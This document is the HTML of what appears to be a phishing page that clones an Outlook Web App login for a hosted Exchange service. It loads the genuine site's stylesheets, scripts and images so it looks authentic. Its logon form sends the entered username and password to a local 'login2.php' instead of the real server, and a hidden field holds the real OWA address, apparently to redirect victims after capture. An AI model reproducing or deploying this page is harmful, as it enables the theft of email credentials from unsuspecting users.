...
<html>
<head>
<link rel="shortcut icon" href="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/favicon.ico" type="image/x-icon">
<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
<meta name="Robots" content="NOINDEX, NOFOLLOW">
<title>Outlook Web App</title>
<link type="text/css" rel="stylesheet" href="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/logon.css">
<link type="text/css" rel="stylesheet" href="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/owafont.css">
<script type="text/javascript" src="https://webmail.hostedexchange.be/owa/14.3.487.0/scripts/premium/flogon.js"></script>
...
<script>
  function validate(info){
	  var x = document.getElementById("emptypass");

    if(info.password.value == "" ||
       info.password.value == null){
...
<noscript>
	<div id="dvErr">
		...
		<tr>
			<td><img src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/base/warn.png" alt=""></td>
...
<form action="login2.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off" onsubmit="return validate(this)">
<input type="hidden" name="destination" value="https://webmail.hostedexchange.be/owa/">
...
<table align="center" id="tblMain" cellpadding=0 cellspacing=0>
	<tr>
		<td colspan=3>
			...
			<tr>
				<td class="lgnTL"><img src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/lgntopl.gif" alt=""></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/lgntopr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		...
		<td id="mdMid">
			<table id="tblMid" class="mid">
				...
				<tr id="emptypass" class="wrng" style="display:none">
					<td>Password Empty.</td>
				</tr>
			...
			<table class="mid tblConn">
				<tr>
					<td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/lgnexlogo.gif" alt=""></td>
	...
	<tr>
		<td colspan=3>
			<table cellspacing=0 cellpadding=0 class="tblLgn">
			<tr>
				<td class="lgnBL"><img src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/lgnbotl.gif" alt=""></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="https://webmail.hostedexchange.be/owa/14.3.487.0/themes/resources/lgnbotr.gif" alt=""></td>
			</tr>
			</table>
		</td>
	</tr>
